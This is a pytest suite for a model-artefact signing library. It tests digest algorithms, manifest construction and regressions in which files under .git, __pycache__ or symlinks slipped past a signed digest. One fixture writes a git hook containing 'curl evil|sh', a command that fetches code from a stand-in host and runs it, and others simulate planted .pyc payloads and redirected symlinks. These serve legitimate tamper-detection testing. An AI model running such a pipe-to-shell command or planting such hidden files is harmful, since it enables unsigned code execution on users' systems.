"""Tests for artefact digests and manifest construction."""
from __future__ import annotations

import hashlib
import os
from pathlib import Path

import pytest

from qresp.signing.digest import (
    DEFAULT_ALGORITHM,
    ExcludedEntry,
    FileEntry,
    build_manifest,
    digest_artefact,
    digest_bytes,
    digest_file,
    manifest_digest,
)


class TestAlgorithmChoice:
    def test_default_is_sha3_not_sha2(self):
        assert DEFAULT_ALGORITHM == "sha3-256"
        assert digest_bytes(b"x") == hashlib.sha3_256(b"x").hexdigest()
        assert digest_bytes(b"x") != hashlib.sha256(b"x").hexdigest()

    def test_sha256_remains_available_for_oms_conformance(self):
        """The OMS registry requires sha256; we emit it alongside, not instead."""
        assert digest_bytes(b"x", "sha256") == hashlib.sha256(b"x").hexdigest()

    def test_unknown_algorithm_is_refused(self):
        with pytest.raises(ValueError, match="unknown digest algorithm"):
            digest_bytes(b"x", "md5")


class TestFileDigest:
    def test_matches_the_in_memory_digest(self, tmp_path: Path):
        f = tmp_path / "a.bin"
        f.write_bytes(b"contents")
        assert digest_file(f) == digest_bytes(b"contents")

    def test_streams_a_large_file(self, tmp_path: Path):
        """Model weights are tens of gigabytes; hashing must not load them."""
        f = tmp_path / "big.bin"
        f.write_bytes(b"\x00" * (3 << 20))
        assert len(digest_file(f)) == 64


class TestManifest:
    def _entries(self):
        return [
            FileEntry("b.txt", 1, {"sha3-256": "bb" * 32}),
            FileEntry("a.txt", 1, {"sha3-256": "aa" * 32}),
        ]

    def test_order_independent(self):
        entries = self._entries()
        assert manifest_digest(entries) == manifest_digest(list(reversed(entries)))

    def test_changing_a_digest_changes_the_manifest(self):
        a = self._entries()
        b = [FileEntry("a.txt", 1, {"sha3-256": "cc" * 32}), a[0]]
        assert manifest_digest(a) != manifest_digest(b)

    def test_renaming_a_file_changes_the_manifest(self):
        a = self._entries()
        b = [FileEntry("renamed.txt", 1, {"sha3-256": "aa" * 32}), a[0]]
        assert manifest_digest(a) != manifest_digest(b)

    def test_length_prefixing_prevents_path_confusion(self):
        """('a/b', X) and ('a', '/b'+X) must not collide. Without length
        prefixes they serialise identically."""
        one = [FileEntry("a/b", 1, {"sha3-256": "ab" * 32})]
        two = [FileEntry("a", 1, {"sha3-256": "ab" * 32})]
        assert manifest_digest(one) != manifest_digest(two)

    def test_domain_separated_from_a_plain_file_digest(self):
        entries = [FileEntry("a", 1, {"sha3-256": "aa" * 32})]
        assert manifest_digest(entries) != digest_bytes(bytes.fromhex("aa" * 32))


class TestBuildManifest:
    def _tree(self, root: Path):
        (root / "sub").mkdir(parents=True)
        (root / "model.bin").write_bytes(b"weights")
        (root / "config.json").write_bytes(b"{}")
        (root / "sub" / "extra.txt").write_bytes(b"more")
        return root

    def test_walks_the_whole_tree(self, tmp_path: Path):
        manifest = build_manifest(self._tree(tmp_path / "m"))
        assert len(manifest) == 3
        assert {e.path for e in manifest.entries} == {
            "model.bin", "config.json", "sub/extra.txt"}

    def test_emits_both_sha3_and_sha256(self, tmp_path: Path):
        """SHA-3 for us, SHA-256 so OMS resource descriptors can be populated."""
        manifest = build_manifest(self._tree(tmp_path / "m"))
        for entry in manifest.entries:
            assert "sha3-256" in entry.digests
            assert "sha256" in entry.digests

    def test_paths_are_posix_relative(self, tmp_path: Path):
        manifest = build_manifest(self._tree(tmp_path / "m"))
        assert all(not e.path.startswith("/") for e in manifest.entries)
        assert "sub/extra.txt" in {e.path for e in manifest.entries}

    def test_root_digest_changes_when_any_file_changes(self, tmp_path: Path):
        root = self._tree(tmp_path / "m")
        before = build_manifest(root).root_digest
        (root / "model.bin").write_bytes(b"tampered")
        assert build_manifest(root).root_digest != before

    def test_adding_a_file_changes_the_root_digest(self, tmp_path: Path):
        root = self._tree(tmp_path / "m")
        before = build_manifest(root).root_digest
        (root / "sneaked.py").write_bytes(b"import os")
        assert build_manifest(root).root_digest != before, (
            "an added file must not slip past a signed manifest"
        )

    def test_symlinks_are_skipped_by_default(self, tmp_path: Path):
        root = self._tree(tmp_path / "m")
        outside = tmp_path / "outside.txt"
        outside.write_bytes(b"not part of the artefact")
        try:
            (root / "link.txt").symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unavailable on this platform")
        assert "link.txt" not in {e.path for e in build_manifest(root).entries}

    def test_empty_tree_is_refused(self, tmp_path: Path):
        empty = tmp_path / "empty"
        empty.mkdir()
        with pytest.raises(ValueError, match="attests to nothing"):
            build_manifest(empty)

    def test_a_file_is_not_a_directory(self, tmp_path: Path):
        f = tmp_path / "a.txt"
        f.write_bytes(b"x")
        with pytest.raises(ValueError, match="not a directory"):
            build_manifest(f)

    def test_total_bytes_reported(self, tmp_path: Path):
        manifest = build_manifest(self._tree(tmp_path / "m"))
        assert manifest.total_bytes == len(b"weights") + len(b"{}") + len(b"more")


class TestDigestArtefact:
    def test_single_file_yields_no_manifest(self, tmp_path: Path):
        f = tmp_path / "a.bin"
        f.write_bytes(b"x")
        digest, manifest = digest_artefact(f)
        assert manifest is None
        assert digest == digest_bytes(b"x")

    def test_directory_yields_a_manifest(self, tmp_path: Path):
        root = tmp_path / "m"
        root.mkdir()
        (root / "a.bin").write_bytes(b"x")
        digest, manifest = digest_artefact(root)
        assert manifest is not None
        assert digest == manifest.root_digest

    def test_callers_need_not_know_which_they_were_given(self, tmp_path: Path):
        """The point of the helper: signing a file and signing a tree are the
        same operation to everything downstream."""
        f = tmp_path / "a.bin"
        f.write_bytes(b"x")
        root = tmp_path / "m"
        root.mkdir()
        (root / "a.bin").write_bytes(b"x")
        for target in (f, root):
            digest, _ = digest_artefact(target)
            assert isinstance(digest, str) and len(digest) == 64


class TestExcludedPathsAreStillBoundIntoTheDigest:
    """Regression tests for a hole that made three unsigned additions invisible.

    `build_manifest` skips `.git`, `__pycache__` and symlinks. Skipping their
    *contents* is right; leaving no trace of them was not. Because a skipped
    file left no record, adding one did not change the digest, so a signature
    over a clean tree kept verifying after an attacker dropped files into it.
    `__pycache__` is the sharp edge: CPython loads a matching `.pyc`, making it
    an unsigned code-execution path behind a signature that verifies clean.
    """

    @staticmethod
    def _tree(tmp_path):
        root = tmp_path / "model"
        root.mkdir()
        (root / "config.json").write_bytes(b'{"arch":"test"}')
        (root / "model.safetensors").write_bytes(b"weights" * 100)
        return root

    def test_adding_a_pycache_payload_changes_the_digest(self, tmp_path):
        root = self._tree(tmp_path)
        before, _ = digest_artefact(root)
        (root / "__pycache__").mkdir()
        (root / "__pycache__" / "loader.cpython-310.pyc").write_bytes(b"payload")
        after, _ = digest_artefact(root)
        assert before != after, "a .pyc CPython will load must not be invisible"

    def test_adding_a_git_payload_changes_the_digest(self, tmp_path):
        root = self._tree(tmp_path)
        before, _ = digest_artefact(root)
        (root / ".git").mkdir()
        (root / ".git" / "hooks").write_bytes(b"#!/bin/sh\ncurl evil|sh")
        after, _ = digest_artefact(root)
        assert before != after

    def test_adding_a_symlink_changes_the_digest(self, tmp_path):
        root = self._tree(tmp_path)
        outside = tmp_path / "evil.bin"
        outside.write_bytes(b"payload")
        before, _ = digest_artefact(root)
        os.symlink(outside, root / "tokenizer.model")
        after, _ = digest_artefact(root)
        assert before != after

    def test_repointing_a_symlink_changes_the_digest(self, tmp_path):
        """No regular file moves, but the artefact resolves differently."""
        root = self._tree(tmp_path)
        good = tmp_path / "good.bin"
        good.write_bytes(b"good")
        evil = tmp_path / "evil.bin"
        evil.write_bytes(b"evil")
        os.symlink(good, root / "link")
        before, _ = digest_artefact(root)
        (root / "link").unlink()
        os.symlink(evil, root / "link")
        after, _ = digest_artefact(root)
        assert before != after, "the symlink target is part of the artefact"

    def test_excluded_contents_are_still_never_read(self, tmp_path):
        """The point is visibility, not hashing: contents stay unread, so the
        original reasons for excluding them are undisturbed."""
        root = self._tree(tmp_path)
        (root / "__pycache__").mkdir()
        (root / "__pycache__" / "a.pyc").write_bytes(b"aaa")
        _, manifest = digest_artefact(root)
        assert [e.path for e in manifest.entries] == ["config.json", "model.safetensors"]
        assert manifest.excluded[0].path == "__pycache__/a.pyc"
        assert manifest.excluded[0].reason == "ignored:__pycache__"

    def test_the_symlink_target_is_recorded(self, tmp_path):
        root = self._tree(tmp_path)
        outside = tmp_path / "evil.bin"
        outside.write_bytes(b"x")
        os.symlink(outside, root / "link")
        _, manifest = digest_artefact(root)
        entry = next(e for e in manifest.excluded if e.path == "link")
        assert entry.reason == "symlink"
        assert entry.target and entry.target.endswith("evil.bin")

    def test_exclusions_cannot_be_confused_with_inclusions(self):
        """Separate domain tags and section counts: a path recorded as excluded
        must not produce the same digest as one recorded as included."""
        included = [FileEntry(path="a", size=1, digests={"sha3-256": "ab" * 32})]
        as_included = manifest_digest(included, "sha3-256")
        as_mixed = manifest_digest(included, "sha3-256",
                                   [ExcludedEntry("a", "symlink", "ab" * 32)])
        assert as_included != as_mixed

    def test_a_clean_tree_is_unaffected(self, tmp_path):
        """No exclusions means no behavioural change beyond the domain tag."""
        root = self._tree(tmp_path)
        _, manifest = digest_artefact(root)
        assert manifest.excluded == []
        assert manifest.exclusion_summary() == {}
